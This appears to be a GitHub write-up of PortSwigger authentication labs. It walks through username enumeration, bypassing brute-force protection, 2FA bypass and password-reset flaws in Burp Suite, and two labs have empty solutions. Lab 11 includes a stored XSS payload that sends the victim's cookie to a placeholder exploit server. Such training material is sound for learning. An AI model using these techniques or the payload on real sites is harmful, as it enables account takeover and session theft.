# Authentication Vulnerabilities

## Lab 1: Username enumeration via different responses

This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the wordlists

To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

### Sol :

Give any username and password. It will give invalid response.

Intercept the request at `HTTP History` in Proxy.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/b908d504-3acc-49b4-8076-8b23c44e4a36)

Send it to the `Intruder`

Give payload symbol for username only for now.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/85997ddb-c27f-4c45-b08a-dac75045435c)

Under payload options, Select `simple list` and paste the usernames list of given `Canditate Usernames` list.

Click `start attack`

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/f460b621-fd67-436a-9e79-dcb481bfa0af)

In the above image, we can see the `ec2-user` has a greater length than others. This is the username we're looking for because it's response says `Incorrect Password` while for others it says `Invalid Username`.

Now clear the payload symbol of username and add it to the password field. The username we identified should be given in the username field. In payload options, use the passwords given in `Canditate Passwords` list.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/35263d46-4476-4cd1-b02c-eecf078a3dd1)

click `start attack`

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/efa1cbb3-7d81-4e12-bbf7-56ead635414b)

In the above image, we got the response code as `302` which is matching password for the username given and others give response code as `200`. 

Login with the found out username and password. ( Username `ec2-user` Password `11111111` in this case)

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/47ee3f19-df59-494e-9f31-f8223342aa95)

Thus, lab is solved.


## Lab 2: Username enumeration via subtly different responses

This lab is subtly vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the given wordlists.

To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

### Sol :

Give any username and password. It will give invalid response.

Intercept the request at `HTTP History` in Proxy.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/d566e218-cdb0-4215-ba7e-6658be813e49)

Send it to the `Intruder`

Give payload symbol for username only for now.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/85997ddb-c27f-4c45-b08a-dac75045435c)

Under options, in `Grep-Extract` field. add `Invalid Username or Password` attribute to it.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/5b569992-fe45-476f-9d09-1e8130dcc49f)

Start the attack by clicking `start attack`

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/e210a87c-4b2c-483d-a17f-2f2cec2052be)

We can see the `alterwind` username has hit the payload as we got unusual pattern than others that it doesn't have `.` at end.

Now clear the payload symbol of username and add it to the password field. The username we identified should be given in the username field. In payload options, use the passwords given in `Canditate Passwords` list.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/37cac23b-fb0c-4e2b-8523-c2a81ec69585)

Start the attack

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/ed95f864-c583-4d55-a026-a05d457df88e)

In the above image, we got the response code as `302` which is matching password for the username given and others give response code as `200`. 

Login with the found out username and password. ( Username `alterwind` Password `1234567` in this case)

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/d4bed274-d4d9-4968-bde0-853438982d6b)

Thus, lab is solved.

## Lab 3: Username enumeration via response timing 

This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page

### Sol :

Intercept the request of login from `HTTP history` in Proxy and send it to repeater.

After attempting multiple invalid logins, our IP will be blocked saying " `You have made too many incorrect login attempts.` ". 

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/cd865f1b-5fd0-4774-a935-c315a181a8d9)

`X-Forwarded-For` header is supported to spoof our IP address and bypass this mechanism.

If we check with invalid usernames, we will get same response time as less time.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/e45454b7-fe57-405a-a9cd-bfa43af4945e)

If we check with valid username (as given `wiener:peter`), we will get response time according to the password length.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/263bfaf8-2dc9-41f9-a70c-ee56a763a224)

Give `wiener:peter` credentials and send it to Intruder

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/ca5c4e50-f4cf-43c0-8d89-5175f6b6a0b2)

Add payload symbols for the `X-Forwarder & username` fields.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/28bf5795-d949-41e0-93e2-70085a85aeb2)

Give payload attack type as `Pitchfork`

Give first payload as numbers from `1-100`

Take 2nd payload as simple list and give usernames as payload from `Canditate Usernames`.

Start the attack and enable the `Response received and Response Completed` columns and we will see below output that one username will show more response time

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/f51e041d-9a6e-40da-a652-6afb24a5a9a7)

we got `am` user and replace it in the username field and add payload symbol to the password field and replace the `Simple list` with the `Canditate Passwords` list passwords.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/edc942e1-8e4b-4e89-bbea-272992e078f8)

We got the username `am` and password `nicole`. Login with this credentials.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/98edeeeb-b2f4-4970-bb5f-90b549ee00dd)

Thus, the lab is solved.

## Lab 4: Broken brute-force protection, IP block

This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim's password, then log in and access their account page

### Sol :

Login with invalid credentials with more than 3 times. It will block our IP saying Please try again.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/74545990-e3b7-41b5-a52d-c2e62d6b9375)

Enter invalid credentials and send it to Intruder.

Create `pitchfork` attack type with payload symbols for both username and password.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/b82f9cc7-3baa-482b-a577-3b87069e67e0)

In `Resource Pool` tab, create a new resource pool by setting `Maximum conccurent requests` to `1`.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/89ed999c-b1d6-43a4-a1d9-d5a0da5b45b4)

By only sending one request at a time, you can ensure that your login attempts are sent to the server in the correct order.

Add a list of payloads that alternates between our username (`wiener`) and carlos. Make sure that your username is first and that carlos is repeated at least 100 times. Add it to the Payload 1 of simple list.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/462701bc-720a-4ecb-b4bb-e7203eecccd9)

Edit the list of candidate passwords and add our own password `peter` before each one

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/5770e479-f92b-47e8-9d95-aa940644c47a)

Add it to the 2nd Payload.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/9ba7c4dd-4f53-4056-8351-69791abed501)

Start the attack.

When the attack finishes, filter the results to hide responses with a `200` status code. Sort the remaining results by username. There should only be a single `302` response for requests with the username `carlos`. Make a note of the password from the Payload 2 column

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/22a315f7-5e46-44cb-92e3-4c107f387f4f)

Thus, the lab is solved.

## Lab 5: Username enumeration via account lock

This lab is vulnerable to username enumeration. It uses account locking, but this contains a logic flaw. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

### Sol :

With Burp running, intercept the login page and submit an invalid username and password. 

Send the login request to Burp Intruder.

Select the `Cluster Bomb` payload and give payload symbols for username and blank symbols at the end of the request.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/67f9e800-e47b-4c8e-ac54-e5c0eb719de1)

Select Payload 1 and give `Usernames` from `canditate usernames` list provided.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/5a7190f6-ff91-47a8-a059-ac57dfd73258)

In 2nd Payload, Give `Null payloads` as type and set payload generation no as `5`.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/d080a9b7-c368-406f-a056-8c23c949b9c6)

Start the attack.

In the results, we can see that the responses for one of the usernames were longer than responses when using other usernames. Make a note of this username.

Study the response more closely and notice that it contains a different error message: `You have made too many incorrect login attempts.`

Create a new Burp request of login, send it to the Intruder and this time select the `Sniper` attack and replace the username value with the username we got previous step. Set the payload symbols to the password parameter.

In the payload, give the passwords provided by `canditate passwords` list

In the results, look at the grep extract column. Notice that there are a couple of different error messages, but one of the responses did not contain any error message. Make a note of this password.

Wait for a minute to allow the account lock to reset. Give the found out username and password values.










## Lab 6: Broken brute-force protection, multiple credentials per request

This lab is vulnerable due to a logic flaw in its brute-force protection. To solve the lab, brute-force Carlos's password, then access his account page.

### Sol :

With Burp running, Intercept the login page. Send it to the Repeater 

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/b928dfbf-4533-4492-97e0-ddd871cba57c)

Replace the username value with `carlos`

Replace the password value with the list values provided by `canditate passwords`. Seperate the values in `" "` and `,` as shown below in image.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/68a67dec-dc9d-4846-b099-472587c441e2)

Run the request, we will get the response as `302 Found`.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/05fe48f9-0093-4f84-967b-f0f680f70d9c)

Right click and select `Show response in browser`

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/43cc8752-2063-4801-8387-4f946ce92ad5)

The response will run and logged in as `carlos` user and lab is solved.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/29496260-dd28-4e5b-ae6d-572292d52682)

## Lab 7: 2FA simple bypass

This lab's two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, access Carlos's account page.

### Sol :

We're given with our own credentials. Login with the `wiener:peter`

Click the `Email client` button to access the emails. You will get the security code in email.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/0c13b3cf-87b2-4203-bf15-23572d18166a)

Submit the security code. we will get `/my-account` page in URL.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/51fa11ee-edb0-4402-89ae-ef9a543153e4)

Log out of `wiener's` account.

Login using victim's credentials (`carlos:montoya`).

To bypass 2FA, give `/my-account` in URL. This will bypass the 2FA of carlos.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/1d15aa62-da7b-4327-9bd3-d8f760cb0d03)

Thus, lab is solved.

## Lab 8: 2FA broken logic

This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos's account page

### Sol :

With Burp running, intercept the request of 2FA verification process. We can see that `verify` parameter in `/login2` is used to determine which user's account is being accessed.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/8d318211-6b28-4d8a-ba23-e19150d6b375)

Send it to the Repeater and Log out of the account.

Change the `verify` parameter to `carlos` and run it. This ensures that a temporary 2FA code is generated for Carlos

Login again with `wiener:peter` credentials. Give an invalid 2FA code.

Intercept the `/login2` request and send it to `Intruder`

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/8db53885-62e2-4dbe-9f41-48d4fb5c89dd)

Replace the `verify` parameter to `carlos` and give payload symbols to the `mfa-code` parameter.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/279ae69b-0df9-430d-86b2-0bd2dfa7e96c)

In the payload options, Select type as `Brute Forcer`.

Give character set as `0123456789`

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/a7910178-3c16-4135-b3f4-a3638e20a86c)

Start the attack.

After finished running 10,000 payloads. One will get `302` as response, which is the 2FA code of the carlos user.

Load the 302 response in the browser by right click and selecting `Show response in browser`.

Thus, the lab is solved.

## Lab 9: 2FA bypass using a brute-force attack

This lab's two-factor authentication is vulnerable to brute-forcing. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, brute-force the 2FA code and access Carlos's account page.

### Sol :


## Lab 10: Brute-forcing a stay-logged-in cookie

This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.

To solve the lab, brute-force Carlos's cookie to gain access to his "My account" page.

### Sol :




## Lab 11: Offline password cracking

This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page.

### Sol :

* With Burp running, use your own account to investigate the "Stay logged in" functionality. Notice that the stay-logged-in cookie is Base64 encoded.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/13e825e7-1733-40b3-91be-1cfc44987663)

* In the Proxy > HTTP history tab, go to the Response to your login request and highlight the stay-logged-in cookie

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/bc1078be-9831-4cd0-b260-50cfd7d8c932)

* You now need to steal the victim user's cookie. Observe that the comment functionality is vulnerable to XSS.
* Go to the exploit server and make a note of the URL.
* Go to one of the blogs and post a comment containing the following stored XSS payload, remembering to enter your own exploit server ID

      <script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>

* On the exploit server, open the access log. There should be a GET request from the victim containing their stay-logged-in cookie.
* Decode the cookie in Burp Decoder. The result will be
  
![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/be7be92b-33ad-4945-afeb-91e01b1c4737)

* Copy the hash and paste it into a search engine. This will reveal that the password is

      onceuponatime

* Log in to the victim's account, go to the "My account" page, and delete their account to solve the lab.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/39a8fadc-3eed-475d-a1a7-dda502b64b22)

* Thus, the lab is solved.
  
## Lab 12: Password reset broken logic

This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his "My account" page

### Sol :

Click `Forget Password` link and give our own username `wiener` 

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/451b4780-b78e-4f4f-9b8f-74247417d928)

Click `Email Client` to see the reset password link.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/525c303c-e828-43fa-8157-97fe5daad55d)

Click the link to reset the password by giving a new password. (Giving our own password). Click Submit.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/63b2e881-5368-45f9-9000-2bd6cd435a5f)

Find the request of forgot password `HTTP history`. Send it to Repeater.

If we remove the value of `forgot-password-token`, it still takes it and responds

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/d3d5a0e9-2fb6-4886-ba1e-bbe3f90306d3)

Again click `Forgot Password` and give username `wiener` and reset the password by clicking the link

Find the request from `HTTP history` and send it to repeater.

Remove the `forgot-password-token` values from both header and body and change the username to `carlos`.

Login with the `carlos:12345` credentials.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/80e760e8-4521-4454-b211-cb362ed22e7f)

Thus, the lab is solved.
